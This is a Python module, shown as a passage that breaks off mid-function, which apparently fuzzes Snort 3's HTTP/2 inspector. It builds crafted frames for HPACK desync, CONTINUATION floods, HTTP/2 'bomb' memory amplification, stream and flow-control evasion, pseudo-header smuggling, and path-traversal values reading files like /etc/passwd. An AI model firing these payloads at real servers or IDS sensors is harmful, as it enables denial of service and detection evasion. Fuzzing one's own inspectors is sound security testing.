import struct
import random
import os
from protocol.dynamic_data import get_commands, random_buffer_size, has_dynamic_data

# ---------------------------------------------------------------------------
# HTTP/2 mutation strategies for Snort 3's `http2_inspect` service inspector.
#
# Design (grounded in RFC 9113 / 7540 + RFC 7541 HPACK + Snort 3 http2_inspect
# internals):
#
# Snort's http2_inspect is a binary-framing-layer inspector that:
#   * must parse the 24-byte connection preface ("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
#     to identify the traffic as HTTP/2 and engage the inspector;
#   * maintains an HPACK dynamic table per connection (RFC 7541) for header
#     decompression — any desynchronisation blinds the IDS;
#   * reassembles header block fragments across HEADERS + CONTINUATION frames
#     before decoding — bounded by internal buffer limits;
#   * tracks per-stream state machines (idle → open → half-closed → closed)
#     to associate DATA with the correct request context;
#   * enforces flow control (per-stream + per-connection WINDOW_UPDATE);
#   * must correctly parse all 10 frame types (DATA, HEADERS, PRIORITY,
#     RST_STREAM, SETTINGS, PUSH_PROMISE, PING, GOAWAY, WINDOW_UPDATE,
#     CONTINUATION) and handle unknown types gracefully;
#   * reconstructs HTTP semantics from pseudo-headers (:method, :path, :scheme,
#     :authority, :status) to feed the upper-layer HTTP rule engine.
#
# Every payload begins with a valid HTTP/2 connection preface + SETTINGS frame
# so Snort classifies the stream as HTTP/2 and engages http2_inspect BEFORE it
# reaches the malicious frames — the same "warm up the inspector" approach used
# by protocol/smtp.py and protocol/ftp.py.
#
# All strategies are client->server (prior-knowledge cleartext h2c mode) and
# are delivered with StreamTransport.wrap_tcp_session (pipe mode) or
# LiveNetworkTransport.send_tcp(port=80) (live mode).
# ---------------------------------------------------------------------------

HTTP2_STRATEGIES = [
    "hpack_state_desync",
    "continuation_flood",
    "stream_interleave_evasion",
    "settings_manipulation",
    "pseudo_header_smuggling",
    "unknown_frame_injection",
    "flow_control_evasion",
    "goaway_desync",
    "priority_tree_attack",
    "push_promise_confusion",
    "data_padding_evasion",
    "rst_stream_race",
    "preface_manipulation",
    "header_block_fragmentation",
]

# Base weights (raw; normalised downstream).  The deepest / highest-yield
# parser surfaces (HPACK, CONTINUATION, stream tracking, pseudo-headers) get
# the most mass; protocol-violation / edge-case strategies get less.
HTTP2_WEIGHTS = [
    14, 12, 10, 8, 10, 6, 8, 5, 4, 5, 7, 6, 3, 7,
]

HTTP2_STRATEGY_LABELS = {
    "hpack_state_desync":          "HPACK State Desync",
    "continuation_flood":          "CONTINUATION Flood",
    "stream_interleave_evasion":   "Stream Interleave Evasion",
    "settings_manipulation":       "SETTINGS Manipulation",
    "pseudo_header_smuggling":     "Pseudo-Header Smuggling",
    "unknown_frame_injection":     "Unknown Frame Injection",
    "flow_control_evasion":        "Flow Control Evasion",
    "goaway_desync":               "GOAWAY Desync",
    "priority_tree_attack":        "Priority Tree Attack",
    "push_promise_confusion":      "PUSH_PROMISE Confusion",
    "data_padding_evasion":        "DATA Padding Evasion",
    "rst_stream_race":             "RST_STREAM Race",
    "preface_manipulation":        "Preface Manipulation",
    "header_block_fragmentation":  "Header Block Fragmentation",
}


# ===== HTTP/2 binary constants ==============================================

# Frame types (RFC 9113 §6)
_FT_DATA          = 0x0
_FT_HEADERS       = 0x1
_FT_PRIORITY      = 0x2
_FT_RST_STREAM    = 0x3
_FT_SETTINGS      = 0x4
_FT_PUSH_PROMISE  = 0x5
_FT_PING          = 0x6
_FT_GOAWAY        = 0x7
_FT_WINDOW_UPDATE = 0x8
_FT_CONTINUATION  = 0x9

# Flags
_FL_END_STREAM  = 0x01
_FL_END_HEADERS = 0x04
_FL_PADDED      = 0x08
_FL_PRIORITY    = 0x20
_FL_ACK         = 0x01  # for SETTINGS / PING

# SETTINGS identifiers (RFC 9113 §6.5.2)
_SET_HEADER_TABLE_SIZE      = 0x1
_SET_ENABLE_PUSH            = 0x2
_SET_MAX_CONCURRENT_STREAMS = 0x3
_SET_INITIAL_WINDOW_SIZE    = 0x4
_SET_MAX_FRAME_SIZE         = 0x5
_SET_MAX_HEADER_LIST_SIZE   = 0x6

# HTTP/2 connection preface — 24-byte magic (RFC 9113 §3.4)
_CLIENT_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

# Benign marker (not real malware — we fuzz the parser, not AV signatures)
_MARKER = b"FUZZ-HIDDEN-PAYLOAD-MARKER-0123456789ABCDEF"


# ===== low-level helpers =====================================================

def _frame(ftype: int, flags: int, stream_id: int, payload: bytes) -> bytes:
    """Build one HTTP/2 frame: 9-byte header + payload."""
    length = len(payload)
    hdr = struct.pack("!I", length)[1:]  # 3-byte big-endian length
    hdr += struct.pack("!BB", ftype, flags)
    hdr += struct.pack("!I", stream_id & 0x7FFFFFFF)
    return hdr + payload


def _settings_frame(*pairs, ack=False) -> bytes:
    """Build a SETTINGS frame with (id, value) pairs."""
    flags = _FL_ACK if ack else 0x00
    payload = b""
    for sid, val in pairs:
        payload += struct.pack("!HI", sid, val)
    return _frame(_FT_SETTINGS, flags, 0, payload)


def _empty_settings() -> bytes:
    """Default SETTINGS with no custom parameters (empty payload)."""
    return _settings_frame()


def _settings_ack() -> bytes:
    return _settings_frame(ack=True)


def _window_update(stream_id: int, increment: int) -> bytes:
    payload = struct.pack("!I", increment & 0x7FFFFFFF)
    return _frame(_FT_WINDOW_UPDATE, 0, stream_id, payload)


def _ping(data: bytes = b"\x00" * 8, ack: bool = False) -> bytes:
    flags = _FL_ACK if ack else 0
    return _frame(_FT_PING, flags, 0, data[:8].ljust(8, b"\x00"))


def _rst_stream(stream_id: int, error_code: int = 0) -> bytes:
    return _frame(_FT_RST_STREAM, 0, stream_id, struct.pack("!I", error_code))


def _goaway(last_stream_id: int, error_code: int = 0, debug: bytes = b"") -> bytes:
    payload = struct.pack("!II", last_stream_id & 0x7FFFFFFF, error_code) + debug
    return _frame(_FT_GOAWAY, 0, 0, payload)


def _priority_frame(stream_id: int, dep: int = 0, weight: int = 16,
                     exclusive: bool = False) -> bytes:
    e_bit = 0x80000000 if exclusive else 0
    payload = struct.pack("!IB", (dep & 0x7FFFFFFF) | e_bit, weight)
    return _frame(_FT_PRIORITY, 0, stream_id, payload)


# ===== HPACK encoding helpers ================================================
#
# We build HPACK encoded header blocks manually.  These helpers intentionally
# support BOTH valid and intentionally malformed HPACK to stress the IDS decoder.

def _hpack_int(value: int, prefix_bits: int, prefix_byte: int = 0) -> bytes:
    """Encode an HPACK integer with the given prefix size (RFC 7541 §5.1).
    prefix_byte carries the high bits (e.g. 0x80 for indexed, 0x40 for incremental)."""
    max_prefix = (1 << prefix_bits) - 1
    if value < max_prefix:
        return bytes([prefix_byte | value])
    out = bytearray([prefix_byte | max_prefix])
    value -= max_prefix
    while value >= 128:
        out.append((value & 0x7F) | 0x80)
        value >>= 7
    out.append(value)
    return bytes(out)


def _hpack_str(s: bytes, huffman: bool = False) -> bytes:
    """Encode an HPACK string literal (RFC 7541 §5.2), no Huffman for simplicity."""
    h_flag = 0x80 if huffman else 0x00
    return _hpack_int(len(s), 7, h_flag) + s


def _hpack_indexed(index: int) -> bytes:
    """Indexed header field representation (RFC 7541 §6.1): top bit = 1."""
    return _hpack_int(index, 7, 0x80)


def _hpack_literal_indexed(index: int, value: bytes) -> bytes:
    """Literal with incremental indexing (RFC 7541 §6.2.1): top 2 bits = 01.
    Uses an existing name from the static/dynamic table at `index`."""
    return _hpack_int(index, 6, 0x40) + _hpack_str(value)


def _hpack_literal_new(name: bytes, value: bytes, indexing: bool = True) -> bytes:
    """Literal header with a new name (not in any table)."""
    if indexing:
        prefix = b"\x40"  # incremental indexing, index=0 → new name
    else:
        prefix = b"\x00"  # without indexing
    return prefix + _hpack_str(name) + _hpack_str(value)


def _hpack_literal_never(name: bytes, value: bytes) -> bytes:
    """Literal header, never indexed (RFC 7541 §6.2.3): top 4 bits = 0001."""
    return b"\x10" + _hpack_str(name) + _hpack_str(value)


def _hpack_table_size_update(new_size: int) -> bytes:
    """Dynamic table size update (RFC 7541 §6.3): top 3 bits = 001."""
    return _hpack_int(new_size, 5, 0x20)


def _minimal_request_headers(stream_id: int = 1, method: bytes = b"GET",
                               path: bytes = b"/", end_stream: bool = True) -> bytes:
    """Build a minimal valid HEADERS frame with HPACK-encoded pseudo-headers
    for a GET / request on the given stream — enough to warm up http2_inspect."""
    block = b""
    block += _hpack_indexed(2)                        # :method = GET
    block += _hpack_indexed(7)                        # :scheme = https
    block += _hpack_literal_indexed(1, b"fuzzer.example.com")  # :authority
    block += _hpack_indexed(4)                        # :path = /
    flags = _FL_END_HEADERS
    if end_stream:
        flags |= _FL_END_STREAM
    return _frame(_FT_HEADERS, flags, stream_id, block)


def _valid_preface() -> bytes:
    """Valid connection preface: magic + empty SETTINGS."""
    return _CLIENT_PREFACE + _empty_settings()


# ===== strategy implementations ==============================================

def build_http2_payload(strategy: str) -> bytes:
    """Build one HTTP/2 payload (client->server bytes) for the given strategy."""

    # ── hpack_state_desync ──────────────────────────────────────────────
    # Target: HPACK dynamic table inside http2_inspect
    # Attack: Desynchronise the IDS's HPACK decoder state so it decodes
    #   subsequent header blocks incorrectly, rendering rules blind.
    #   Techniques: table size updates to 0 and back (force eviction cycle),
    #   integer overflow in HPACK variable-length ints, out-of-bounds index
    #   references, huge dynamic table entries that push eviction boundaries.
    if strategy == "hpack_state_desync":
        variant = random.choice([
            "table_size_churn", "int_overflow", "index_oob",
            "eviction_boundary", "huffman_pad_corrupt", "bomb_entry",
            "indexed_ref_bomb", "cookie_crumb_bomb",
        ])
        frames = _valid_preface()

        if variant == "table_size_churn":
            # Rapid table size updates: 0 → 4096 → 0 → 65536 in the same
            # header block forces repeated eviction cycles.
            block = _hpack_table_size_update(0)
            block += _hpack_table_size_update(4096)
            block += _hpack_table_size_update(0)
            block += _hpack_table_size_update(65536)
            # Follow with a valid request using indexed fields that may now
            # reference evicted entries.
            block += _hpack_indexed(2)   # :method GET
            block += _hpack_indexed(7)   # :scheme https
            block += _hpack_literal_indexed(1, b"target.example.com")
            block += _hpack_indexed(4)   # :path /
            frames += _frame(_FT_HEADERS, _FL_END_HEADERS | _FL_END_STREAM, 1, block)

        elif variant == "int_overflow":
            # HPACK integer with maximum continuation bytes — attempts to
            # overflow the IDS's integer accumulator.
            # Craft a literal header where the name-length field is encoded
            # with many continuation bytes all set to 0xFF.
            block = b"\x40"  # literal with incremental indexing, new name
            # String length field: 7-bit prefix full (0x7F) + 20 continuation bytes
            # all 0xFF = extremely large value.  A well-behaved decoder caps this,
            # but an IDS might not.
            block += b"\x7f" + (b"\xff" * 20) + b"\x00"  # terminates with 0x00
            block += b"A" * 10  # name bytes (way shorter than declared → desync)
            block += _hpack_str(b"value")
            frames += _frame(_FT_HEADERS, _FL_END_HEADERS | _FL_END_STREAM, 1, block)

        elif variant == "index_oob":
            # Reference a static table index far beyond 61 (the maximum valid
            # static index) before any dynamic entries exist.
            block = _hpack_indexed(200)  # index 200 — does not exist
            block += _hpack_indexed(2)
            block += _hpack_indexed(4)
            frames += _frame(_FT_HEADERS, _FL_END_HEADERS | _FL_END_STREAM, 1, block)

        elif variant == "eviction_boundary":
            # Insert a header with a value exactly equal to the dynamic table
            # size (4096 - 32 overhead = 4064 bytes for name+value), then
            # reference it — the next insertion will evict it.
            big_val = b"X" * 4000
            block = _hpack_literal_new(b"x-big", big_val, indexing=True)
            # Reference the entry we just inserted (dynamic index = 62)
            block += _hpack_indexed(62)
            # Insert another entry which evicts the first
            block += _hpack_literal_new(b"x-evict", b"Y" * 4000, indexing=True)
            # Now reference 62 again — it should be the NEW entry, but a buggy
            # IDS might still see the old one.
            block += _hpack_indexed(62)
            block += _hpack_indexed(2)   # :method GET
            block += _hpack_indexed(4)   # :path /
            frames += _frame(_FT_HEADERS, _FL_END_HEADERS | _FL_END_STREAM, 1, block)

        elif variant == "huffman_pad_corrupt":
            # A Huffman-encoded string with invalid padding (not MSBs of EOS).
            # Valid Huffman pad bits must be 1s (MSBs of EOS symbol 0x3fffffff).
            block = b"\x40"  # literal with incremental indexing
            # Name: valid indexed reference to :path (index 4)
            block = _hpack_int(4, 6, 0x40)
            # Value: Huffman flag set, length 3, but data has bad pad
            block += b"\x83"  # H=1, length=3
            block += b"\x00\x00\x00"  # all-zero = invalid Huffman padding
            frames += _frame(_FT_HEADERS, _FL_END_HEADERS | _FL_END_STREAM, 1, block)

        elif variant == "indexed_ref_bomb":
            # CVE-2016-6581 / CVE-2025-53020 / CVE-2026-49975 — HTTP/2 Bomb.
            # NEW variant: the amplification comes from per-entry bookkeeping,
            # not the header value.  Seed the dynamic table with a tiny header
            # (nearly empty value), then reference it thousands of times.  Each
            # 1-byte indexed reference costs the server ~70–4000 bytes of
            # allocation depending on implementation.  The decoded-size limit
            # never fires because there is almost nothing to decode.
            # We send multiple streams to multiply the effect.
            num_refs = random.choice([1000, 2000, 5000])
            # Stream 1: seed the dynamic table entry
            block = _hpack_indexed(2)   # :method GET
            block += _hpack_indexed(7)  # :scheme https
            block += _hpack_literal_indexed(1, b"target.example.com")
            block += _hpack_indexed(4)  # :path /
            # Insert a tiny header with incremental indexing → dynamic entry
            block += _hpack_literal_new(b"x-seed", b"A", indexing=True)
            frames += _frame(_FT_HEADERS, _FL_END_HEADERS | _FL_END_STREAM, 1, block)
            # Streams 3,5,7,...: reference the seed entry (dynamic index 62)
            # thousands of times via 1-byte indexed representations
            sid = 3
            for batch in range(0, num_refs, 500):
                count = min(500, num_refs - batch)
                block2 = _hpack_indexed(2)   # :method GET
                block2 += _hpack_indexed(7)  # :scheme https
                block2 += _hpack_indexed(62) # :authority = seeded entry
                block2 += _hpack_indexed(4)  # :path /
                # Emit 'count' indexed references to the seeded entry
                block2 += _hpack_indexed(62) * count
                frames += _frame(_FT_HEADERS, _FL_END_HEADERS | _FL_END_STREAM,
                                 sid, block2)
                sid += 2

        elif variant == "cookie_crumb_bomb":
            # HTTP/2 Bomb — Cookie splitting bypass (CVE-2026-49975).
            # RFC 9113 §8.2.3 allows splitting Cookie into one field per crumb.
            # Servers that cap header-field count don't count cookie crumbs
            # against the limit.  We seed one cookie value via HPACK indexing,
            # then reference it thousands of times as separate Cookie crumbs.
            # Servers reassemble the full Cookie string → massive allocation.
            num_crumbs = random.choice([500, 1000, 2000])
            cookie_val = b"session=" + b"X" * random.choice([64, 256, 4000])
            block = _hpack_indexed(2)   # :method GET
            block += _hpack_indexed(7)  # :scheme https
            block += _hpack_literal_indexed(1, b"target.example.com")
            block += _hpack_indexed(4)  # :path /
            # Insert cookie with incremental indexing → dynamic index 62
            block += _hpack_literal_indexed(32, cookie_val)  # cookie (static idx 32)
            # Now reference index 62 (the cookie entry) many times — each
            # becomes a separate Cookie crumb the server must reassemble
            block += _hpack_indexed(62) * num_crumbs
            frames += _frame(_FT_HEADERS, _FL_END_HEADERS | _FL_END_STREAM, 1, block)

        else:  # bomb_entry
            # Insert a header with a 16KB value that forces dynamic table
            # to grow past default SETTINGS_HEADER_TABLE_SIZE, testing whether
            # the IDS enforces the limit.
            big_val = bytes(random.choices(range(0x20, 0x7f), k=16000))
            block = _hpack_literal_new(b"x-bomb", big_val, indexing=True)
            block += _hpack_indexed(2)
            block += _hpack_indexed(4)
            frames += _frame(_FT_HEADERS, _FL_END_HEADERS | _FL_END_STREAM, 1, block)

        return frames

    # ── continuation_flood ──────────────────────────────────────────────
    # Target: Header block reassembly buffer in http2_inspect
    # Attack: CVE-2024-27316 pattern — send HEADERS without END_HEADERS
    #   followed by many small CONTINUATION frames. The IDS must buffer
    #   ALL fragments before it can decode HPACK and run rules. Overwhelms
    #   memory or hits an internal buffer limit causing it to skip inspection.
    elif strategy == "continuation_flood":
        variant = random.choice([
            "many_tiny", "many_medium", "no_end_headers",
            "interleaved_illegal", "empty_continuations",
        ])
        frames = _valid_preface()

        if variant == "many_tiny":
            # HEADERS (no END_HEADERS) + 500 CONTINUATION frames of 1 byte each.
            block = _hpack_indexed(2)  # :method GET
            frames += _frame(_FT_HEADERS, 0, 1, block[:1])  # partial block, no END_HEADERS
            for i in range(500):
                frag = bytes([random.randint(0, 255)])
                fl = _FL_END_HEADERS if i == 499 else 0
                frames += _frame(_FT_CONTINUATION, fl, 1, frag)

        elif variant == "many_medium":
            # 200 CONTINUATION frames of ~100 bytes each (total ~20KB header block).
            header_block = _hpack_indexed(2) + _hpack_indexed(7)
            header_block += _hpack_literal_indexed(1, b"target.example.com")
            header_block += _hpack_indexed(4)
            # Pad with many literal headers
            for i in range(100):
                header_block += _hpack_literal_new(
                    f"x-pad-{i}".encode(), b"A" * 80, indexing=False)
            frames += _frame(_FT_HEADERS, 0, 1, header_block[:50])
            remaining = header_block[50:]
            chunk_size = 100
            chunks = [remaining[i:i+chunk_size] for i in range(0, len(remaining), chunk_size)]
            for idx, chunk in enumerate(chunks):
                fl = _FL_END_HEADERS if idx == len(chunks) - 1 else 0
                frames += _frame(_FT_CONTINUATION, fl, 1, chunk)

        elif variant == "no_end_headers":
            # Send HEADERS + several CONTINUATIONs but NEVER set END_HEADERS.
            # Per spec the connection should eventually error, but the IDS must
            # handle this edge case in its state machine.
            block = _hpack_indexed(2) + _hpack_indexed(4)
            frames += _frame(_FT_HEADERS, 0, 1, block)
            for _ in range(100):
                frames += _frame(_FT_CONTINUATION, 0, 1,
                                 _hpack_literal_new(b"x-neverend", b"V" * 50, indexing=False))
            # End with a PING to keep the connection alive
            frames += _ping()

        elif variant == "interleaved_illegal":
            # HEADERS (no END_HEADERS) on stream 1, then a DATA frame on
            # stream 3 (protocol violation — must be CONTINUATION next).
            # Tests IDS error recovery.
            block = _hpack_indexed(2) + _hpack_indexed(4)
            frames += _frame(_FT_HEADERS, 0, 1, block)
            frames += _frame(_FT_DATA, _FL_END_STREAM, 3, _MARKER)
            frames += _frame(_FT_CONTINUATION, _FL_END_HEADERS, 1,
                             _hpack_literal_indexed(1, b"host.example.com"))

        else:  # empty_continuations
            # HEADERS + 1000 zero-length CONTINUATION frames.
            block = _hpack_indexed(2) + _hpack_indexed(4)
            frames += _frame(_FT_HEADERS, 0, 1, block)
            for i in range(1000):
                fl = _FL_END_HEADERS if i == 999 else 0
                frames += _frame(_FT_CONTINUATION, fl, 1, b"")

        return frames

    # ── stream_interleave_evasion ───────────────────────────────────────
    # Target: Per-stream state tracking in http2_inspect
    # Attack: Spread a single malicious request/payload across many
    #   interleaved streams so the IDS has difficulty correlating frames
    #   to the correct request context. Also tests rapid stream creation,
    #   out-of-order IDs, and stream ID exhaustion.
    elif strategy == "stream_interleave_evasion":
        variant = random.choice([
            "round_robin", "high_stream_ids", "rapid_open_close",
            "data_before_headers", "reuse_closed",
        ])
        frames = _valid_preface()

        if variant == "round_robin":
            # Open 50 streams simultaneously, send 1-byte DATA on each in
            # round-robin, then close them all.  IDS must track all 50.
            stream_ids = list(range(1, 101, 2))  # 1,3,5,...,99 (50 odd streams)
            for sid in stream_ids:
                frames += _minimal_request_headers(sid, end_stream=False)
            marker_chunks = [_MARKER[i:i+1] for i in range(len(_MARKER))]
            for i, byte in enumerate(marker_chunks):
                sid = stream_ids[i % len(stream_ids)]
                fl = _FL_END_STREAM if i == len(marker_chunks) - 1 else 0
                frames += _frame(_FT_DATA, fl, sid, byte)

        elif variant == "high_stream_ids":
            # Use very high stream IDs to exhaust the IDS stream table.
            for sid in [1, 0x7FFFFFFE - 1, 0x7FFFFFFE - 3, 0x7FFFFFFE - 5]:
                if sid % 2 == 0:
                    sid += 1  # ensure odd
                frames += _minimal_request_headers(sid)

        elif variant == "rapid_open_close":
            # Open 200 streams and immediately RST_STREAM each one.
            for i in range(200):
                sid = 2 * i + 1
                frames += _minimal_request_headers(sid)
                frames += _rst_stream(sid, 0x8)  # CANCEL

        elif variant == "data_before_headers":
            # Send DATA on stream 1 BEFORE sending HEADERS — protocol violation.
            # IDS must handle gracefully without crashing.
            frames += _frame(_FT_DATA, 0, 1, _MARKER)
            frames += _minimal_request_headers(1)

        else:  # reuse_closed
            # Send HEADERS on stream 1, close it with END_STREAM, then send
            # more HEADERS on stream 1 again (reuse — protocol violation).
            frames += _minimal_request_headers(1, end_stream=True)
            frames += _minimal_request_headers(1, end_stream=True)

        return frames

    # ── settings_manipulation ───────────────────────────────────────────
    # Target: SETTINGS processing and parameter tracking in http2_inspect
    # Attack: Abuse SETTINGS to change IDS-tracked parameters in ways that
    #   cause it to misparse subsequent frames. E.g. set MAX_FRAME_SIZE
    #   to 2^24-1 then send a giant DATA frame; rapidly toggle
    #   HEADER_TABLE_SIZE; send malformed SETTINGS payloads.
    elif strategy == "settings_manipulation":
        variant = random.choice([
            "max_frame_size", "table_size_toggle", "window_size_overflow",
            "unknown_setting", "malformed_payload", "settings_flood",
        ])
        frames = _valid_preface()

        if variant == "max_frame_size":
            # Set MAX_FRAME_SIZE to maximum (2^24-1 = 16777215), then send
            # a DATA frame larger than the default 16384.
            frames += _settings_frame((_SET_MAX_FRAME_SIZE, 0xFFFFFF))
            frames += _minimal_request_headers(1, end_stream=False)
            frames += _frame(_FT_DATA, _FL_END_STREAM, 1, b"D" * 32768)

        elif variant == "table_size_toggle":
            # Rapidly alternate HEADER_TABLE_SIZE between 0 and 65536.
            for val in [0, 65536, 0, 65536, 0, 4096]:
                frames += _settings_frame((_SET_HEADER_TABLE_SIZE, val))

        elif variant == "window_size_overflow":
            # Set INITIAL_WINDOW_SIZE to 2^31-1 (maximum), which when combined
            # with any WINDOW_UPDATE will overflow the window.
            frames += _settings_frame((_SET_INITIAL_WINDOW_SIZE, 0x7FFFFFFF))
            frames += _minimal_request_headers(1, end_stream=False)
            # Any WINDOW_UPDATE now causes FLOW_CONTROL_ERROR, but the IDS
            # must handle it without crashing.
            frames += _window_update(1, 1)

        elif variant == "unknown_setting":
            # SETTINGS with unknown identifiers (0x00FF, 0xFFFF) — per spec
            # the receiver MUST ignore unknown settings, but IDS may not.
            frames += _settings_frame((0x00FF, 42), (0xFFFF, 0xDEADBEEF))

        elif variant == "malformed_payload":
            # SETTINGS payload that is NOT a multiple of 6 bytes → FRAME_SIZE_ERROR.
            # The IDS must detect this as an error without crashing.
            bad_payload = b"\x00\x01\x00\x00\x10\x00\xFF"  # 7 bytes (not multiple of 6)
            frames += _frame(_FT_SETTINGS, 0, 0, bad_payload)

        else:  # settings_flood
            # 500 SETTINGS frames in rapid succession without ACKs.
            for _ in range(500):
                frames += _settings_frame(
                    (_SET_MAX_CONCURRENT_STREAMS, random.randint(1, 1000)))

        return frames

    # ── pseudo_header_smuggling ─────────────────────────────────────────
    # Target: HTTP semantic reconstruction from pseudo-headers in http2_inspect
    # Attack: Exploit how the IDS reconstructs :method/:path/:scheme/:authority
    #   to match HTTP rules.  Duplicate pseudo-headers, wrong ordering,
    #   uppercase field names, prohibited Connection-specific headers, and
    #   :authority vs Host disagreement can cause the IDS to misidentify the
    #   request method/path or skip inspection entirely.
    elif strategy == "pseudo_header_smuggling":
        variant = random.choice([
            "duplicate_path", "pseudo_after_regular", "uppercase_name",
            "authority_host_mismatch", "missing_method", "prohibited_headers",
            "path_encoding",
        ])
        frames = _valid_preface()

        if variant == "duplicate_path":
            # Two :path pseudo-headers — which does the IDS use?
            block = _hpack_indexed(2)                       # :method GET
            block += _hpack_indexed(7)                      # :scheme https
            block += _hpack_literal_indexed(1, b"host.example.com")
            block += _hpack_literal_indexed(5, b"/safe")    # :path = /safe
            block += _hpack_literal_indexed(5, b"/admin")   # :path = /admin (dup!)
            frames += _frame(_FT_HEADERS, _FL_END_HEADERS | _FL_END_STREAM, 1, block)

        elif variant == "pseudo_after_regular":
            # Regular header before pseudo-headers — prohibited per RFC 9113 §8.3.
            block = _hpack_literal_new(b"x-custom", b"before-pseudos", indexing=False)
            block += _hpack_indexed(2)  # :method GET
            block += _hpack_indexed(4)  # :path /
            block += _hpack_indexed(7)  # :scheme https
            block += _hpack_literal_indexed(1, b"host.example.com")
            frames += _frame(_FT_HEADERS, _FL_END_HEADERS | _FL_END_STREAM, 1, block)

        elif variant == "uppercase_name":
            # Uppercase field names — prohibited in HTTP/2 (RFC 9113 §8.2.1).
            block = _hpack_indexed(2)
            block += _hpack_indexed(7)
            block += _hpack_literal_indexed(1, b"host.example.com")
            block += _hpack_indexed(4)
            block += _hpack_literal_new(b"X-UPPER", b"value", indexing=False)
            block += _hpack_literal_new(b"Content-Type", b"text/html", indexing=False)
            frames += _frame(_FT_HEADERS, _FL_END_HEADERS | _FL_END_STREAM, 1, block)

        elif variant == "authority_host_mismatch":
            # :authority and Host header disagree — prohibited in RFC 9113.
            block = _hpack_indexed(2)
            block += _hpack_indexed(7)
            block += _hpack_literal_indexed(1, b"real-authority.com")   # :authority
            block += _hpack_indexed(4)
            block += _hpack_literal_indexed(38, b"fake-host.evil.com")  # host (index 38)
            frames += _frame(_FT_HEADERS, _FL_END_HEADERS | _FL_END_STREAM, 1, block)

        elif variant == "missing_method":
            # No :method pseudo-header — IDS must handle gracefully.
            block = _hpack_indexed(7)  # :scheme
            block += _hpack_indexed(4)  # :path
            block += _hpack_literal_indexed(1, b"host.example.com")
            frames += _frame(_FT_HEADERS, _FL_END_HEADERS | _FL_END_STREAM, 1, block)

        elif variant == "prohibited_headers":
            # Connection-specific headers prohibited in HTTP/2:
            # Connection, Keep-Alive, Transfer-Encoding, Upgrade
            block = _hpack_indexed(2)
            block += _hpack_indexed(7)
            block += _hpack_literal_indexed(1, b"host.example.com")
            block += _hpack_indexed(4)
            block += _hpack_literal_new(b"connection", b"keep-alive", indexing=False)
            block += _hpack_literal_new(b"transfer-encoding", b"chunked", indexing=False)
            block += _hpack_literal_new(b"upgrade", b"h2c", indexing=False)
            frames += _frame(_FT_HEADERS, _FL_END_HEADERS | _FL_END_STREAM, 1, block)

        else:  # path_encoding
            # :path with URL-encoded characters, null bytes, dot-dot traversal,
            # and Unicode — tests IDS URI normalization.
            evil_paths = [
                b"/..%2f..%2f..%2fetc/passwd",
                b"/%00/admin",
                b"/safe\x00/../../etc/shadow",
                b"/" + b"\xc0\xaf" * 50,  # overlong UTF-8 encoding of '/'
                b"/" + b"A" * 8000,  # very long path
            ]
            path = random.choice(evil_paths)
            block = _hpack_indexed(2)
            block += _hpack_indexed(7)
            block += _hpack_literal_indexed(1, b"host.example.com")
            block += _hpack_literal_indexed(5, path)  # :path = evil path
            frames += _frame(_FT_HEADERS, _FL_END_HEADERS | _FL_END_STREAM, 1, block)

        return frames

    # ── unknown_frame_injection ─────────────────────────────────────────
    # Target: Frame parser and type dispatch in http2_inspect
    # Attack: Inject frames with undefined type codes (0x0A–0xFF). Per spec
    #   unknown frame types MUST be ignored, but the IDS must correctly skip
    #   the payload based on the length field. A misparse shifts alignment
    #   and corrupts all subsequent frame parsing.
    elif strategy == "unknown_frame_injection":
        variant = random.choice([
            "between_headers_data", "large_unknown", "zero_length",
            "many_unknown_types", "unknown_on_stream",
        ])
        frames = _valid_preface()

        if variant == "between_headers_data":
            # Unknown frame type (0xFE) between HEADERS and DATA on the same stream.
            frames += _minimal_request_headers(1, end_stream=False)
            frames += _frame(0xFE, 0, 1, os.urandom(200))  # unknown type
            frames += _frame(_FT_DATA, _FL_END_STREAM, 1, _MARKER)

        elif variant == "large_unknown":
            # Unknown frame with a 50KB payload — tests length-based skipping.
            frames += _frame(0xAB, 0, 0, os.urandom(50000))
            frames += _minimal_request_headers(1)

        elif variant == "zero_length":
            # 20 unknown frames with zero-length payloads.
            for ft in range(0x0A, 0x1E):
                frames += _frame(ft, 0, 0, b"")
            frames += _minimal_request_headers(1)

        elif variant == "many_unknown_types":
            # One frame of every undefined type (0x0A through 0xFF).
            for ft in range(0x0A, 0x100):
                frames += _frame(ft, random.randint(0, 0xFF), 0, os.urandom(8))
            frames += _minimal_request_headers(1)

        else:  # unknown_on_stream
            # Unknown frame type with stream ID > 0, interleaved with valid requests.
            frames += _minimal_request_headers(1, end_stream=False)
            frames += _frame(0xDD, 0, 1, _MARKER[:20])
            frames += _frame(_FT_DATA, _FL_END_STREAM, 1, _MARKER[20:])

        return frames

    # ── flow_control_evasion ────────────────────────────────────────────
    # Target: Flow control window tracking in http2_inspect
    # Attack: Manipulate WINDOW_UPDATE and DATA sizes to desync the IDS's
    #   flow control accounting. Sending DATA that exceeds the window should
    #   be a FLOW_CONTROL_ERROR, but the IDS must still inspect the bytes.
    #   Zero-increment WINDOW_UPDATE is a protocol error.
    elif strategy == "flow_control_evasion":
        variant = random.choice([
            "exceed_window", "zero_increment", "negative_window",
            "many_tiny_data", "padded_data_flood", "window_stall",
        ])
        frames = _valid_preface()

        if variant == "exceed_window":
            # Send 100KB of DATA without any WINDOW_UPDATE (default window=65535).
            frames += _minimal_request_headers(1, end_stream=False)
            data = _MARKER * 2500  # ~105KB
            # Split into 16KB chunks (max default frame size)
            for i in range(0, len(data), 16384):
                chunk = data[i:i+16384]
                fl = _FL_END_STREAM if i + 16384 >= len(data) else 0
                frames += _frame(_FT_DATA, fl, 1, chunk)

        elif variant == "zero_increment":
            # WINDOW_UPDATE with increment=0 — PROTOCOL_ERROR.
            frames += _minimal_request_headers(1, end_stream=False)
            frames += _window_update(1, 0)  # zero increment
            frames += _frame(_FT_DATA, _FL_END_STREAM, 1, _MARKER)

        elif variant == "negative_window":
            # SETTINGS reduces INITIAL_WINDOW_SIZE causing existing stream
            # windows to go negative. Then send DATA that would be within
            # the new window but IDS tracking may be confused.
            frames += _settings_frame((_SET_INITIAL_WINDOW_SIZE, 65535))
            frames += _minimal_request_headers(1, end_stream=False)
            frames += _frame(_FT_DATA, 0, 1, b"A" * 30000)
            # Now reduce window size — stream window becomes negative
            frames += _settings_frame((_SET_INITIAL_WINDOW_SIZE, 100))
            # Send more data — should be blocked by flow control, but IDS may
            # have lost track.
            frames += _frame(_FT_DATA, _FL_END_STREAM, 1, _MARKER)

